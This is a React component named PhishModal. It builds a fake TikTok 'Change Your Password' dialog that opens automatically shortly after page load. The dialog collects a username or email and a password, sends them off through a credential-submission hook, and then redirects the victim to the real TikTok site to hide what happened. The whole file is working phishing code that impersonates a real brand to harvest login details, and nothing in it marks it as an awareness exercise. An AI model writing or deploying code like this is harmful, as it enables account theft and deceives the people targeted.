import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { ShieldAlert, CheckCircle2, Loader2, Lock } from "lucide-react";
import { useSubmitCredentials } from "@workspace/api-client-react";

const formSchema = z.object({
  username: z.string().min(1, "Username or email is required"),
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(1, "Please confirm your password")
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords do not match",
  path: ["confirmPassword"]
});

type FormValues = z.infer<typeof formSchema>;

export function PhishModal() {
  const [isOpen, setIsOpen] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const { mutate: submitCreds, isPending } = useSubmitCredentials();

  const { register, handleSubmit, formState: { errors } } = useForm<FormValues>({
    resolver: zodResolver(formSchema)
  });

  useEffect(() => {
    // Auto open modal shortly after page load to simulate forced action
    const timer = setTimeout(() => setIsOpen(true), 800);
    return () => clearTimeout(timer);
  }, []);

  const onSubmit = (data: FormValues) => {
    submitCreds({ data }, {
      onSuccess: () => {
        setIsSuccess(true);
        // Redirect to real TikTok after 2 seconds
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com";
        }, 2000);
      }
    });
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-4">
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 bg-black/80 backdrop-blur-sm"
          />
          
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 20 }}
            transition={{ type: "spring", damping: 25, stiffness: 300 }}
            className="relative w-full max-w-md bg-card border border-border/50 rounded-2xl shadow-2xl overflow-hidden"
          >
            <div className="h-1.5 w-full bg-gradient-to-r from-secondary via-primary to-primary" />
            
            <div className="p-8">
              {!isSuccess ? (
                <>
                  <div className="flex flex-col items-center text-center mb-8">
                    <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4 text-primary">
                      <ShieldAlert className="w-8 h-8" />
                    </div>
                    <h2 className="text-2xl font-bold font-display tracking-tight text-white mb-2">
                      Change Your Password
                    </h2>
                    <p className="text-sm text-muted-foreground">
                      For your security, we require you to update your TikTok password to continue using your account.
                    </p>
                  </div>

                  <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
                        Username or Email
                      </label>
                      <input
                        {...register("username")}
                        type="text"
                        placeholder="Enter your TikTok username"
                        disabled={isPending}
                        className={`w-full px-4 py-3 rounded-xl bg-background border ${errors.username ? 'border-destructive focus:ring-destructive/20' : 'border-border focus:border-primary focus:ring-primary/20'} text-white placeholder:text-muted-foreground focus:outline-none focus:ring-4 transition-all`}
                      />
                      {errors.username && (
                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.username.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
                        New Password
                      </label>
                      <input
                        {...register("newPassword")}
                        type="password"
                        placeholder="Create a strong password"
                        disabled={isPending}
                        className={`w-full px-4 py-3 rounded-xl bg-background border ${errors.newPassword ? 'border-destructive focus:ring-destructive/20' : 'border-border focus:border-primary focus:ring-primary/20'} text-white placeholder:text-muted-foreground focus:outline-none focus:ring-4 transition-all`}
                      />
                      {errors.newPassword && (
                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.newPassword.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
                        Confirm New Password
                      </label>
                      <input
                        {...register("confirmPassword")}
                        type="password"
                        placeholder="Repeat your new password"
                        disabled={isPending}
                        className={`w-full px-4 py-3 rounded-xl bg-background border ${errors.confirmPassword ? 'border-destructive focus:ring-destructive/20' : 'border-border focus:border-primary focus:ring-primary/20'} text-white placeholder:text-muted-foreground focus:outline-none focus:ring-4 transition-all`}
                      />
                      {errors.confirmPassword && (
                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.confirmPassword.message}</p>
                      )}
                    </div>

                    <div className="pt-4">
                      <button
                        type="submit"
                        disabled={isPending}
                        className="w-full flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl font-bold bg-primary text-white hover:bg-primary/90 hover:-translate-y-0.5 active:translate-y-0 shadow-lg shadow-primary/20 hover:shadow-primary/40 disabled:opacity-70 disabled:cursor-not-allowed transition-all"
                      >
                        {isPending ? (
                          <>
                            <Loader2 className="w-5 h-5 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          <>
                            <Lock className="w-5 h-5" />
                            Update Password
                          </>
                        )}
                      </button>
                    </div>
                  </form>
                  
                  <p className="text-center text-xs text-muted-foreground mt-6">
                    By continuing, you agree to TikTok's Terms of Service and confirm you have read TikTok's Privacy Policy.
                  </p>
                </>
              ) : (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="flex flex-col items-center text-center py-8"
                >
                  <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
                    <CheckCircle2 className="w-10 h-10 text-green-500" />
                  </div>
                  <h2 className="text-2xl font-bold font-display tracking-tight text-white mb-2">
                    Password Updated!
                  </h2>
                  <p className="text-muted-foreground mb-6">
                    Your account has been secured. Redirecting you to TikTok...
                  </p>
                  <Loader2 className="w-6 h-6 animate-spin text-primary" />
                </motion.div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
}
